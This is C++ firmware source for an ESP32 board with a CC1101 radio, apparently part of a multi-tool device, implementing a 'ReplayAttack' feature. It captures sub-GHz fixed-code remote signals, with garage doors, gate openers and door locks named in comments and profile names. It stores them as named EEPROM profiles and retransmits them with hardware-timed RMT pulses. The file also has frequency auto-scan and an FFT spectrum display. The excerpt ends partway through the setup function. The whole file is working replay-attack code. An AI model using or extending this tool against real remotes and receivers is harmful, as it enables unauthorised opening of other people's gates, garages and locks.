#include "subconfig.h"
#include "shared.h"
#include "icon.h"
#include "Touchscreen.h"
#include "driver/rmt.h"  // ESP32 RMT peripheral for hardware-timed OOK transmission
#include <cstring>       // For memset()

/*
 * ReplayAttack
 * 
 * 
 * 
 */

namespace replayat {

// DEBUG: Interrupt counter to verify pin 16 is receiving transitions from CC1101
volatile unsigned long gdo0_interrupt_count = 0;
volatile unsigned long gdo0_last_state = 0;
void IRAM_ATTR gdo0DebugISR() {
    gdo0_interrupt_count++;
}

#define EEPROM_SIZE 1440
#define ADDR_VALUE 1280    // 4 bytes
#define ADDR_BITLEN 1284   // 2 bytes
#define ADDR_PROTO 1286    // 2 bytes
#define ADDR_FREQ 1288     // 4 bytes 

#define SCREEN_WIDTH  240
#define SCREENHEIGHT 320
#define SCREEN_HEIGHT 320

static bool uiDrawn = false;

#define MAX_NAME_LENGTH 16 // Maximum length for profile name (including null terminator)

// Keyboard layout (4 rows)
const char* keyboardLayout[] = {
  "1234567890",
  "QWERTYUIOP",
  "ASDFGHJKL",
  "ZXCVBNM<-" // '<' for backspace, '-' for clear
};

// Random name suggestions for shuffle
const char* randomNames[] = {
  "Signal", "Remote", "KeyFob", "GateOpener", "DoorLock",
  "RFTest", "Profile", "Control", "Switch", "Beacon"
};
const int numRandomNames = 10;
int randomNameIndex = 0;

// Keyboard dimensions
const int keyWidth = 22;
const int keyHeight = 22;
const int keySpacing = 2;
const int yOffsetStart = 95;

// Cursor blink state
static bool cursorState = true;
static unsigned long lastCursorBlink = 0;
const unsigned long cursorBlinkInterval = 500;

struct Profile {
    uint32_t frequency;
    unsigned long value;
    int bitLength;
    int protocol;
    char name[MAX_NAME_LENGTH]; // Custom name field
};

#define PROFILE_SIZE sizeof(Profile) // Size of the updated Profile struct
#define ADDR_PROFILE_START 1300
#define MAX_PROFILES 4  // Fixed: EEPROM only has 140 bytes, each profile is 32 bytes
#define ADDR_PROFILE_COUNT 0 

int profileCount = 0;

RCSwitch mySwitch = RCSwitch();
bool subghz_receive_active = false;  // Flag to track if RCSwitch receive is enabled (for safe cleanup)

// Cleanup function for switching FROM SubGHz TO 2.4GHz modes
void cleanupSubGHz() {
    if (subghz_receive_active) {
        mySwitch.disableReceive();
        subghz_receive_active = false;
    }
    ELECHOUSE_cc1101.setSidle();  // Put CC1101 in idle mode
    SPI.end();                     // Release SPI bus
    delay(10);
    pinMode(27, OUTPUT);
    digitalWrite(27, HIGH);        // Deselect CC1101 CSN
    pinMode(16, INPUT);            // Release GDO0/RX pin for NRF24 CE
    pinMode(26, INPUT);            // Release GDO2/TX pin
    Serial.println("[SubGHz] Cleanup complete - radios released for 2.4GHz");
}

arduinoFFT FFTSUB = arduinoFFT();

const uint16_t samplesSUB = 256; 
const double FrequencySUB = 5000;

double attenuation_num = 10;

unsigned int sampling_period;
unsigned long micro_s;

double vRealSUB[samplesSUB];
double vImagSUB[samplesSUB];

byte red[128], green[128], blue[128];

unsigned int epochSUB = 0;
unsigned int colorcursor = 2016;

int rssi;

#define RX_PIN 16         
#define TX_PIN 26 

#define BTN_LEFT   4
#define BTN_RIGHT  5
#define BTN_UP     6
#define BTN_DOWN   3

unsigned long receivedValue = 0; 
int receivedBitLength = 0;       
int receivedProtocol = 0;       
const int rssi_threshold = -75; 

static const uint32_t subghz_frequency_list[] = {
    300000000, 303875000, 304250000, 310000000, 315000000, 318000000,  
    390000000, 418000000, 433075000, 433420000, 433920000, 434420000, 
    434775000, 438900000, 868350000, 915000000, 925000000
};

int currentFrequencyIndex = 0;
int yshift = 20;

// ============================================================================
// AUTO-SCAN MODE - Sweeps frequencies looking for signals
// ============================================================================
bool autoScanMode = false;           // Auto-scan enabled
int autoScanIndex = 0;               // Current frequency in scan sweep
unsigned long autoScanLastChange = 0; // Time of last frequency change
#define AUTO_SCAN_DWELL_MS 100       // Time to dwell on each frequency (ms)
#define AUTO_SCAN_RSSI_THRESHOLD -60 // RSSI threshold to pause scan (dBm)
bool autoScanPaused = false;         // Paused on signal detection
unsigned long autoScanPauseTime = 0; // When we paused
#define AUTO_SCAN_PAUSE_MS 2000      // How long to pause on signal (ms)
const int numFrequenciesReplay = sizeof(subghz_frequency_list) / sizeof(subghz_frequency_list[0]);

// ============================================================================
// RMT-BASED REPLAY - Hardware-timed OOK transmission
// Replaces RCSwitch software timing (10-150μs jitter) with RMT (~100ns jitter)
// ============================================================================

// RCSwitch protocol timing structure
struct RCProtocol {
    uint16_t pulseLength;      // Base pulse length in microseconds
    uint8_t syncHigh, syncLow; // Sync pulse ratios
    uint8_t zeroHigh, zeroLow; // Zero bit ratios
    uint8_t oneHigh, oneLow;   // One bit ratios
    bool inverted;             // Invert logic levels
};

// Protocol lookup table - pre-calculated from RCSwitch library
// Source: https://github.com/sui77/rc-switch/blob/master/RCSwitch.cpp
static const RCProtocol rcProtocols[] = {
    // Proto 0: Invalid/placeholder
    { 0, 0, 0, 0, 0, 0, 0, false },
    // Proto 1: PT2262, EV1527 (most common - garage doors, remotes)
    { 350, 1, 31, 1, 3, 3, 1, false },
    // Proto 2: KlikAanKlikUit
    { 650, 1, 10, 1, 2, 2, 1, false },
    // Proto 3: Tri-state remotes
    { 100, 30, 71, 4, 11, 9, 6, false },
    // Proto 4: Intertechno
    { 380, 1, 6, 1, 3, 3, 1, false },
    // Proto 5: TPI/I-C sockets
    { 500, 6, 14, 1, 2, 2, 1, false },
    // Proto 6: HT6P20B, Conrad RSL (inverted)
    { 450, 23, 1, 1, 2, 2, 1, true },
    // Proto 7: HS2303-PT
    { 150, 2, 62, 1, 6, 6, 1, false },
    // Proto 8:
    { 200, 3, 130, 7, 16, 3, 16, false },
    // Proto 9: (inverted)
    { 200, 130, 7, 16, 7, 16, 3, true },
    // Proto 10: Brennenstuhl (inverted)
    { 365, 18, 1, 3, 1, 1, 3, true },
    // Proto 11: (inverted)
    { 270, 36, 1, 1, 2, 2, 1, true },
    // Proto 12: (inverted)
    { 320, 36, 1, 1, 2, 2, 1, true },
};
static const int NUM_RC_PROTOCOLS = sizeof(rcProtocols) / sizeof(rcProtocols[0]);

// RMT symbol buffer for replay (max 64 bits + 1 sync = 65 symbols)
#define RMT_REPLAY_MAX_SYMBOLS 128
static rmt_item32_t replaySymbols[RMT_REPLAY_MAX_SYMBOLS];

}  // End namespace replayat (temporarily for forward declarations)

// Forward declaration for subbrute RMT functions at global scope
namespace subbrute {
    extern bool rmtInitialized;
    bool initRMT();
    void rmtTransmit(rmt_item32_t* items, size_t numItems);
}

namespace replayat {  // Reopen replayat namespace

/**
 * Build RMT symbols from RCSwitch captured data
 * @param protocol Protocol number (1-12)
 * @param value The captured code value
 * @param bitLength Number of bits in the code
 * @return Number of symbols built
 */
int buildReplaySymbols(int protocol, unsigned long value, int bitLength) {
    if (protocol < 1 || protocol >= NUM_RC_PROTOCOLS) {
        Serial.printf("[REPLAY-RMT] Invalid protocol %d\n", protocol);
        return 0;
    }

    const RCProtocol& proto = rcProtocols[protocol];
    uint8_t highLevel = proto.inverted ? 0 : 1;
    uint8_t lowLevel = proto.inverted ? 1 : 0;

    int idx = 0;

    // RCSwitch sends data bits FIRST, then sync pulse
    // Bits are sent MSB first
    for (int i = bitLength - 1; i >= 0 && idx < RMT_REPLAY_MAX_SYMBOLS - 1; i--) {
        if ((value >> i) & 1) {
            // One bit
            replaySymbols[idx].level0 = highLevel;
            replaySymbols[idx].duration0 = proto.pulseLength * proto.oneHigh;
            replaySymbols[idx].level1 = lowLevel;
            replaySymbols[idx].duration1 = proto.pulseLength * proto.oneLow;
        } else {
            // Zero bit
            replaySymbols[idx].level0 = highLevel;
            replaySymbols[idx].duration0 = proto.pulseLength * proto.zeroHigh;
            replaySymbols[idx].level1 = lowLevel;
            replaySymbols[idx].duration1 = proto.pulseLength * proto.zeroLow;
        }
        idx++;
    }

    // Add sync pulse AFTER data bits
    replaySymbols[idx].level0 = highLevel;
    replaySymbols[idx].duration0 = proto.pulseLength * proto.syncHigh;
    replaySymbols[idx].level1 = lowLevel;
    replaySymbols[idx].duration1 = proto.pulseLength * proto.syncLow;
    idx++;

    return idx;
}

/**
 * Send captured signal using RMT hardware timing
 * @param protocol Protocol number (1-12)
 * @param value The code value
 * @param bitLength Number of bits
 * @param repetitions Number of times to repeat (default 10)
 * @return true if successful
 */
bool rmtReplaySend(int protocol, unsigned long value, int bitLength, int repetitions = 10) {
    // Ensure RMT is initialized
    if (!::subbrute::rmtInitialized) {
        if (!::subbrute::initRMT()) {
            Serial.println("[REPLAY-RMT] RMT init failed!");
            return false;
        }
    }

    // Build the RMT symbols
    int numSymbols = buildReplaySymbols(protocol, value, bitLength);
    if (numSymbols == 0) {
        return false;
    }

    Serial.printf("[REPLAY-RMT] Sending: proto=%d, val=%lu, bits=%d, reps=%d, symbols=%d\n",
                  protocol, value, bitLength, repetitions, numSymbols);
    Serial.flush();

    // Transmit with repetitions (RCSwitch default is 10)
    for (int rep = 0; rep < repetitions; rep++) {
        ::subbrute::rmtTransmit(replaySymbols, numSymbols);
        yield();  // Allow FreeRTOS to breathe
    }

    return true;
}


void updateDisplay() {
    uiDrawn = false;

    tft.fillRect(0, 40, 240, 40, TFT_BLACK);  
    tft.drawLine(0, 80, 240, 80, TFT_WHITE);

    // Frequency - show AUTO-SCAN when enabled
    tft.setCursor(5, 20 + yshift);
    tft.setTextColor(TFT_CYAN);
    tft.print("Freq:");
    tft.setCursor(50, 20 + yshift);
    if (autoScanMode) {
        // In auto-scan mode - show current scan frequency with indicator
        if (autoScanPaused) {
            tft.setTextColor(TFT_RED);  // Red = paused on signal
            tft.print("*");
        } else {
            tft.setTextColor(TFT_GREEN);  // Green = actively scanning
        }
        tft.print(subghz_frequency_list[autoScanIndex] / 1000000.0, 2);
        tft.setTextColor(TFT_YELLOW);
        tft.print(" AUTO");
    } else {
        tft.setTextColor(TFT_WHITE);
        tft.print(subghz_frequency_list[currentFrequencyIndex] / 1000000.0, 2);
        tft.print(" MHz");
    }
    
    // Bit Length
    tft.setCursor(5, 35 + yshift);
    tft.setTextColor(TFT_CYAN);
    tft.print("Bit:");
    tft.setTextColor(TFT_WHITE);
    tft.setCursor(50, 35 + yshift);
    tft.printf("%d", receivedBitLength);

    // RSSI
    tft.setCursor(130, 35 + yshift);
    tft.setTextColor(TFT_CYAN);
    tft.print("RSSI:");
    tft.setTextColor(TFT_WHITE);
    tft.setCursor(170, 35 + yshift);
    tft.printf("%d", ELECHOUSE_cc1101.getRssi());    

    // Protocol
    tft.setCursor(130, 20 + yshift);
    tft.setTextColor(TFT_CYAN);
    tft.print("Ptc:");
    tft.setTextColor(TFT_WHITE);
    tft.setCursor(170, 20 + yshift);
    tft.printf("%d", receivedProtocol);

    // Received Value
    tft.setCursor(5, 50 + yshift);
    tft.setTextColor(TFT_CYAN);
    tft.print("Val:");
    tft.setTextColor(TFT_WHITE);
    tft.setCursor(50, 50 + yshift);
    tft.print(receivedValue);

    // Tune CC1101 to current frequency (auto-scan uses autoScanIndex)
    ELECHOUSE_cc1101.setSidle();
    if (autoScanMode) {
        ELECHOUSE_cc1101.setMHZ(subghz_frequency_list[autoScanIndex] / 1000000.0);
    } else {
        ELECHOUSE_cc1101.setMHZ(subghz_frequency_list[currentFrequencyIndex] / 1000000.0);
    }
    ELECHOUSE_cc1101.SetRx();
}


void drawInputField(String& inputName) {
  tft.fillRect(10, 55, 220, 25, TFT_DARKGREY);
  tft.drawRect(9, 54, 222, 27, ORANGE);
  tft.setTextColor(TFT_WHITE);
  tft.setTextSize(2);
  tft.setCursor(15, 60);
  String displayText = inputName;
  if (cursorState) {
    displayText += "|";
  }
  tft.println(displayText);
}

void drawKeyboard(String& inputName) {
  tft.fillRect(0, 37, SCREEN_WIDTH, SCREEN_HEIGHT - 37, TFT_BLACK);

  // Instructional text
  tft.setTextColor(ORANGE);
  tft.setTextSize(1);
  tft.setCursor(1, 235);
  tft.println("[!] Set a name for the saved profile.");
  tft.setCursor(23, 250);
  tft.println("(max 15 chars)");

  tft.setCursor(1, 275);
  tft.println("[!] Shuffle: Suggests random profile");
  tft.setCursor(23, 290);
  tft.println("names for your signal.");

  drawInputField(inputName);

  // Draw keyboard
  int yOffset = yOffsetStart;
  for (int row = 0; row < 4; row++) {
    int xOffset = 1;
    for (int col = 0; col < strlen(keyboardLayout[row]); col++) {
      tft.fillRect(xOffset, yOffset, keyWidth, keyHeight, TFT_DARKGREY);
      tft.setTextColor(TFT_WHITE);
      tft.setTextSize(1);
      tft.setCursor(xOffset + 6, yOffset + 5);
      tft.print(keyboardLayout[row][col]);
      xOffset += keyWidth + keySpacing;
    }
    yOffset += keyHeight + keySpacing;
  }

  // Draw buttons
  tft.setTextColor(ORANGE);
  tft.setTextSize(1);
  tft.setTextDatum(MC_DATUM);

  // Back Button
  tft.fillRoundRect(5, 195, 70, 25, 4, DARK_GRAY);
  tft.drawRoundRect(5, 195, 70, 25, 4, ORANGE);
  tft.drawString("Back", 40, 208);

  // Shuffle Button
  tft.fillRoundRect(85, 195, 70, 25, 4, DARK_GRAY);
  tft.drawRoundRect(85, 195, 70, 25, 4, ORANGE);
  tft.drawString("Shuffle", 120, 208);

  // OK Button
  tft.fillRoundRect(165, 195, 70, 25, 4, DARK_GRAY);
  tft.drawRoundRect(165, 195, 70, 25, 4, ORANGE);
  tft.drawString("OK", 200, 208);

  tft.setTextDatum(TL_DATUM); // Reset to top-left for other text
}

String getUserInputName() {
  String inputName = "";
  bool keyboardActive = true;

  drawKeyboard(inputName);

  while (keyboardActive) {
    // Blink cursor
    if (millis() - lastCursorBlink >= cursorBlinkInterval) {
      cursorState = !cursorState;
      drawInputField(inputName);
      lastCursorBlink = millis();
    }

    if (ts.touched()) {
      TS_Point p = ts.getPoint();
      int x = map(p.x, 300, 3800, 0, SCREEN_WIDTH - 1);
      int y = map(p.y, 3800, 300, 0, SCREEN_HEIGHT - 1);

      // Handle keyboard keys
      int yOffset = yOffsetStart;
      for (int row = 0; row < 4; row++) {
        int xOffset = 1;
        for (int col = 0; col < strlen(keyboardLayout[row]); col++) {
          if (x >= xOffset && x <= xOffset + keyWidth && y >= yOffset && y <= yOffset + keyHeight) {
            char c = keyboardLayout[row][col];
            // Highlight key
            tft.fillRect(xOffset, yOffset, keyWidth, keyHeight, ORANGE);
            tft.setTextColor(TFT_WHITE);
            tft.setTextSize(1);
            tft.setCursor(xOffset + 6, yOffset + 5);
            tft.print(c);
            delay(100); // Visual feedback
            tft.fillRect(xOffset, yOffset, keyWidth, keyHeight, TFT_DARKGREY);
            tft.setTextColor(TFT_WHITE);
            tft.setCursor(xOffset + 6, yOffset + 5);
            tft.print(c);

            if (c == '<') { // Backspace
              if (inputName.length() > 0) {
                inputName = inputName.substring(0, inputName.length() - 1);
              }
            } else if (c == '-') { // Clear
              inputName = "";
            } else if (inputName.length() < MAX_NAME_LENGTH - 1) {
              inputName += c;
            }
            drawInputField(inputName);
            delay(200); // Debounce
          }
          xOffset += keyWidth + keySpacing;
        }
        yOffset += keyHeight + keySpacing;
      }

      // Handle buttons
      if (x >= 5 && x <= 75 && y >= 195 && y <= 210) { // Back
        keyboardActive = false;
        inputName = ""; // Cancel input
        tft.fillScreen(TFT_BLACK);
        updateDisplay();
      }

      if (x >= 85 && x <= 155 && y >= 195 && y <= 210) { // Shuffle
        inputName = randomNames[randomNameIndex];
        randomNameIndex = (randomNameIndex + 1) % numRandomNames;
        drawInputField(inputName);
        delay(200); // Debounce
      }

      if (x >= 165 && x <= 235 && y >= 195 && y <= 210) { // OK
        if (inputName.length() > 0) {
          keyboardActive = false;
          return inputName;
        } else {
          tft.fillRect(10, 80, 220, 10, TFT_BLACK);
          tft.setTextColor(TFT_RED);
          tft.setTextSize(1);
          tft.setCursor(10, 85);
          tft.println("Name cannot be empty!");
          tft.setTextColor(TFT_WHITE);
          delay(500);
          drawInputField(inputName); // Redraw to clear error
          delay(200); // Debounce
        }
      }
    }
    delay(10);
  }
  return inputName; // Return empty string if cancelled
}




void sendSignal() {

    mySwitch.disableReceive();
    delay(100);

    // Set CC1101 to transmit mode
    ELECHOUSE_cc1101.SetTx();

    tft.fillRect(0, 40, 240, 37, TFT_BLACK);
    tft.setCursor(10, 30 + yshift);
    tft.print("Sending (RMT)...");
    tft.setCursor(10, 40 + yshift);
    tft.print(receivedValue);

    // ========================================
    // RMT-BASED TRANSMISSION (Hardware Timing)
    // ========================================
    bool success = false;
    if (receivedProtocol >= 1 && receivedProtocol < NUM_RC_PROTOCOLS) {
        // Use RMT for hardware-precise timing
        success = rmtReplaySend(receivedProtocol, receivedValue, receivedBitLength, 10);
    }

    // Fallback to RCSwitch if RMT fails or protocol unknown
    if (!success) {
        Serial.println("[REPLAY] Falling back to RCSwitch");
        mySwitch.enableTransmit(TX_PIN);
        mySwitch.setProtocol(receivedProtocol);
        mySwitch.send(receivedValue, receivedBitLength);
        mySwitch.disableTransmit();
    }

    delay(500);
    tft.fillRect(0, 40, 240, 37, TFT_BLACK);
    tft.setCursor(10, 30 + yshift);
    tft.print("Done!");

    ELECHOUSE_cc1101.SetRx();
    delay(100);
    mySwitch.enableReceive(RX_PIN);
    replayat::subghz_receive_active = true;

    delay(500);
    updateDisplay();
}

void do_sampling() {
  
  micro_s = micros();

  #define ALPHA 0.2  
  float ewmaRSSI = -50;  

for (int i = 0; i < samplesSUB; i++) {
    int rssi = ELECHOUSE_cc1101.getRssi();
    rssi += 100;  

    ewmaRSSI = (ALPHA * rssi) + ((1 - ALPHA) * ewmaRSSI);

    vRealSUB[i] = ewmaRSSI * 2;
    vImagSUB[i] = 1;

    while (micros() < micro_s + sampling_period);
    micro_s += sampling_period;
}

  double mean = 0;
  
  for (uint16_t i = 0; i < samplesSUB; i++)
        mean += vRealSUB[i];
        mean /= samplesSUB;
  for (uint16_t i = 0; i < samplesSUB; i++)
        vRealSUB[i] -= mean;
    
  micro_s = micros();
  
  FFTSUB.Windowing(vRealSUB, samplesSUB, FFT_WIN_TYP_HAMMING, FFT_FORWARD); 
  FFTSUB.Compute(vRealSUB, vImagSUB, samplesSUB, FFT_FORWARD); 
  FFTSUB.ComplexToMagnitude(vRealSUB, vImagSUB, samplesSUB); 

unsigned int left_x = 120;
unsigned int graph_y_offset = 81; 
int max_k = 0;

for (int j = 0; j < samplesSUB >> 1; j++) {
    int k = vRealSUB[j] / attenuation_num; 
    if (k > max_k)
        max_k = k; 
    if (k > 127) k = 127; 

    unsigned int color = red[k] << 11 | green[k] << 5 | blue[k];
    unsigned int vertical_x = left_x + j; 

    tft.drawPixel(vertical_x, epochSUB + graph_y_offset, color); 
}

for (int j = 0; j < samplesSUB >> 1; j++) {
    int k = vRealSUB[j] / attenuation_num;
    if (k > max_k)
        max_k = k;
    if (k > 127) k = 127;

    unsigned int color = red[k] << 11 | green[k] << 5 | blue[k];
    unsigned int mirrored_x = left_x - j; 
    tft.drawPixel(mirrored_x, epochSUB + graph_y_offset, color);
}

  double tattenuation = max_k / 127.0;
  
  if (tattenuation > attenuation_num)
    attenuation_num = tattenuation;
                     
    delay(10);
}

void readProfileCount() {
    EEPROM.get(ADDR_PROFILE_START - sizeof(int), profileCount);
    if (profileCount > MAX_PROFILES || profileCount < 0) {
        profileCount = 0;  
    }
}

void saveProfile() {
    readProfileCount();  

    if (profileCount < MAX_PROFILES) {
        // Get custom name from user
        String customName = getUserInputName();

        tft.setTextSize(1);

        Profile newProfile;
        newProfile.frequency = subghz_frequency_list[currentFrequencyIndex];
        newProfile.value = receivedValue;
        newProfile.bitLength = receivedBitLength;
        newProfile.protocol = receivedProtocol;
        strncpy(newProfile.name, customName.c_str(), MAX_NAME_LENGTH - 1);
        newProfile.name[MAX_NAME_LENGTH - 1] = '\0'; // Ensure null termination

        int addr = ADDR_PROFILE_START + (profileCount * PROFILE_SIZE);
        EEPROM.put(addr, newProfile); 
        EEPROM.commit();

        profileCount++;  

        EEPROM.put(ADDR_PROFILE_START - sizeof(int), profileCount);
        EEPROM.commit();  

        tft.fillScreen(TFT_BLACK);
        tft.setCursor(10, 30 + yshift);
        tft.print("Profile saved!");
        tft.setCursor(10, 40 + yshift);
        tft.print("Name: ");
        tft.print(newProfile.name);
        tft.setCursor(10, 50 + yshift);
        tft.print("Profiles saved: ");
        tft.println(profileCount);

    } else {
        tft.fillScreen(TFT_BLACK);
        tft.setCursor(10, 30 + yshift);
        tft.print("Profile storage full!");
    }
    
    delay(2000);
    updateDisplay();
    float currentBatteryVoltage = readBatteryVoltage();
    drawStatusBar(currentBatteryVoltage, false);
}

void loadProfileCount() {
    EEPROM.get(ADDR_PROFILE_START - 4, profileCount);  // Fixed: was reading wrong address (profile data, not count)
    if (profileCount > MAX_PROFILES || profileCount < 0) {
        profileCount = 0;  // Reset to safe value if corrupted
    }
}

void runUI() {

    #define STATUS_BAR_Y_OFFSET 20
    #define STATUS_BAR_HEIGHT 16
    #define ICON_SIZE 16
    #define ICON_NUM 5 // Increased to include the back icon
    
    static int iconX[ICON_NUM] = {90, 130, 170, 210, 10}; // Added back icon at x=10
    static int iconY = STATUS_BAR_Y_OFFSET;
    
    static const unsigned char* icons[ICON_NUM] = {
        bitmap_icon_sort_up_plus,    
        bitmap_icon_sort_down_minus,      
        bitmap_icon_antenna,    
        bitmap_icon_floppy,
        bitmap_icon_go_back // Added back icon
    };

    if (!uiDrawn) {
        tft.drawLine(0, 19, 240, 19, TFT_WHITE);
        tft.fillRect(0, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH, STATUS_BAR_HEIGHT, DARK_GRAY);
        
        for (int i = 0; i < ICON_NUM; i++) {
            if (icons[i] != NULL) {  
                tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_WHITE);
            } 
        }
        tft.drawLine(0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, SCREEN_WIDTH, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, ORANGE);
        uiDrawn = true;               
    }

    static unsigned long lastAnimationTime = 0;
    static int animationState = 0;  
    static int activeIcon = -1;

    if (animationState > 0 && millis() - lastAnimationTime >= 150) {
        if (animationState == 1) {
            tft.drawBitmap(iconX[activeIcon], iconY, icons[activeIcon], ICON_SIZE, ICON_SIZE, TFT_WHITE);
            animationState = 2;

            switch (activeIcon) {
                case 0:  // Frequency UP - at end toggles AUTO-SCAN
                    if (autoScanMode) {
                        // Exit auto-scan mode, go to first frequency
                        autoScanMode = false;
                        autoScanPaused = false;
                        currentFrequencyIndex = 0;
                    } else if (currentFrequencyIndex >= numFrequenciesReplay - 1) {
                        // At last frequency - enable AUTO-SCAN
                        autoScanMode = true;
                        autoScanIndex = 0;
                        autoScanLastChange = millis();
                        autoScanPaused = false;
                    } else {
                        // Normal increment
                        currentFrequencyIndex++;
                    }
                    ELECHOUSE_cc1101.setSidle();
                    ELECHOUSE_cc1101.setMHZ(subghz_frequency_list[autoScanMode ? autoScanIndex : currentFrequencyIndex] / 1000000.0);
                    ELECHOUSE_cc1101.SetRx();
                    EEPROM.put(ADDR_FREQ, currentFrequencyIndex);
                    EEPROM.commit();
                    updateDisplay();
                    break;
                case 1:  // Frequency DOWN - at start toggles AUTO-SCAN
                    if (autoScanMode) {
                        // Exit auto-scan mode, go to last frequency
                        autoScanMode = false;
                        autoScanPaused = false;
                        currentFrequencyIndex = numFrequenciesReplay - 1;
                    } else if (currentFrequencyIndex <= 0) {
                        // At first frequency - enable AUTO-SCAN
                        autoScanMode = true;
                        autoScanIndex = 0;
                        autoScanLastChange = millis();
                        autoScanPaused = false;
                    } else {
                        // Normal decrement
                        currentFrequencyIndex--;
                    }
                    ELECHOUSE_cc1101.setSidle();
                    ELECHOUSE_cc1101.setMHZ(subghz_frequency_list[autoScanMode ? autoScanIndex : currentFrequencyIndex] / 1000000.0);
                    ELECHOUSE_cc1101.SetRx();
                    EEPROM.put(ADDR_FREQ, currentFrequencyIndex);
                    EEPROM.commit();
                    updateDisplay();
                    break;
                case 2: 
                    sendSignal();
                    break;
                case 3: 
                    saveProfile();
                    break;
                case 4: // Back icon action (exit to submenu)
                    feature_exit_requested = true;
                    break;
            }
        } else if (animationState == 2) {
            animationState = 0;
            activeIcon = -1;
        }
        lastAnimationTime = millis();  
    }

    static unsigned long lastTouchCheck = 0;
    const unsigned long touchCheckInterval = 50; 

    if (millis() - lastTouchCheck >= touchCheckInterval) {
        if (ts.touched() && feature_active) { 
            TS_Point p = ts.getPoint();
            int x = ::map(p.x, 300, 3800, 0, SCREEN_WIDTH - 1);
            int y = ::map(p.y, 3800, 300, 0, SCREENHEIGHT - 1);

            if (y > STATUS_BAR_Y_OFFSET && y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
                for (int i = 0; i < ICON_NUM; i++) {
                    if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
                        if (icons[i] != NULL && animationState == 0) {
                            tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_BLACK);
                            animationState = 1;
                            activeIcon = i;
                            lastAnimationTime = millis();
                        }
                        break;
                    }
                }
            }
        }
        lastTouchCheck = millis();
    }
}

void ReplayAttackSetup() {
  Serial.begin(115200);

  // NRF24 cleanup - release pins and SPI bus before CC1101 init
  pinMode(17, OUTPUT);
  digitalWrite(17, HIGH);        // Deselect NRF24 CSN
  SPI.end();                      // Release SPI bus
  delay(10);
  pinMode(16, INPUT);            // Reconfigure pin 16 for CC1101 GDO0/RX
  Serial.println("[SubGHz] NRF24 cleanup - SPI released for CC1101");

  tft.fillScreen(TFT_BLACK);
  tft.setRotation(0);

  setupTouchscreen();

  // Read saved settings from EEPROM FIRST
  EEPROM.begin(EEPROM_SIZE);
  readProfileCount();
  EEPROM.get(ADDR_VALUE, receivedValue);
  EEPROM.get(ADDR_BITLEN, receivedBitLength);
  EEPROM.get(ADDR_PROTO, receivedProtocol);
  EEPROM.get(ADDR_FREQ, currentFrequencyIndex);

  // Validate EEPROM data - reset garbage values to sane defaults
  // Bit length must be 1-64 (RCSwitch max), Protocol must be 1-12
  if (receivedBitLength < 1 || receivedBitLength > 64) {
      Serial.printf("[EEPROM] Invalid bitLength %d, resetting to 0\n", receivedBitLength);
      receivedBitLength = 0;
      receivedValue = 0;
  }
  if (receivedProtocol < 0 || receivedProtocol > 12) {
      Serial.printf("[EEPROM] Invalid protocol %d, resetting to 0\n", receivedProtocol);
      receivedProtocol = 0;
  }
  // Validate frequency index
  if (currentFrequencyIndex < 0 || currentFrequencyIndex >= numFrequenciesReplay) {
      Serial.printf("[EEPROM] Invalid freq index %d, resetting to 0\n", currentFrequencyIndex);
      currentFrequencyIndex = 0;
  }

  // Initialize CC1101 - USE setGDO() for proper async mode pin config!
  // Per agent audit: In async serial mode (setCCMode(0)):
  //   - GDO0 = TX data INPUT to CC1101 (ESP32 should be OUTPUT)
  //   - GDO2 = RX data OUTPUT from CC1101 (ESP32 should be INPUT)
  // The library's GDO_Set() correctly sets: GDO0=OUTPUT, GDO2=INPUT
  // CRITICAL: GPIO16 may conflict with PSRAM on 16MB ESP32!
  ELECHOUSE_cc1101.setGDO(RX_PIN, TX_PIN);  // GDO0=16 (TX), GDO2=26 (RX)
  Serial.printf("[CC1101] GDO pins: GDO0=%d (TX-OUTPUT), GDO2=%d (RX-INPUT)\n", RX_PIN, TX_PIN);

  ELECHOUSE_cc1101.Init();

  // ========== CC1101 DIAGNOSTIC CHECK ==========
  Serial.println("\n========== CC1101 DIAGNOSTIC ==========");
  if (ELECHOUSE_cc1101.getCC1101()) {
      Serial.println("[CC1101] DETECTED - Chip is responding!");
  } else {
      Serial.println("[CC1101] NOT DETECTED - Check SPI wiring!");
  }
  Serial.printf("[CC1101] Frequency Index: %d\n", currentFrequencyIndex);
  Serial.printf("[CC1101] Saved Freq: %.2f MHz\n", subghz_frequency_list[currentFrequencyIndex] / 1000000.0);

  // EXPLICIT CC1101 configuration for SubGHz RX
  ELECHOUSE_cc1101.setCCMode(0);      // Raw/RCSwitch mode (IOCFG0=0x0D for serial data output)
  ELECHOUSE_cc1101.setModulation(2);  // ASK/OOK modulation
  ELECHOUSE_cc1101.setMHZ(subghz_frequency_list[currentFrequencyIndex] / 1000000.0);  // Tune to saved freq
  ELECHOUSE_cc1101.setRxBW(812.50);   // Wide bandwidth for better sensitivity
  ELECHOUSE_cc1101.SetRx();           // Enter RX mode

  float actualFreq = subghz_frequency_list[currentFrequencyIndex] / 1000000.0;
  Serial.printf("[CC1101] Configured: Freq=%.2f MHz, Mod=ASK, RxBW=812.5kHz, Mode=RX\n", actualFreq);

  // Pin modes already set by setGDO() via GDO_Set():
  // GDO0 (pin 16) = OUTPUT (for TX to CC1101)
  // GDO2 (pin 26) = INPUT (for RX from CC1101)
  // Just verify they're correct:
  Serial.printf("[CC1101] Pin modes: GPIO%d=%s, GPIO%d=%s\n",
                RX_PIN, "OUTPUT(TX)", TX_PIN, "INPUT(RX)");

  // Test RSSI read
  delay(50);  // Let CC1101 settle in RX mode
  int testRssi = ELECHOUSE_cc1101.getRssi();
  byte mode = ELECHOUSE_cc1101.getMode();
  Serial.printf("[CC1101] Initial RSSI: %d dBm, Mode: %d (should be 2=RX)\n", testRssi, mode);

  // DEBUG: Read back IOCFG0 register to verify async serial data output is configured
  // IOCFG0 should be 0x0D for async serial data (what RCSwitch needs)
  // If it's 0x06 that means sync mode (wrong for RCSwitch)
  byte iocfg0 = ELECHOUSE_cc1101.SpiReadReg(0x02);  // CC1101_IOCFG0 = 0x02
  byte iocfg2 = ELECHOUSE_cc1101.SpiReadReg(0x00);  // CC1101_IOCFG2 = 0x00
  byte pktctrl0 = ELECHOUSE_cc1101.SpiReadReg(0x08);  // CC1101_PKTCTRL0 = 0x08
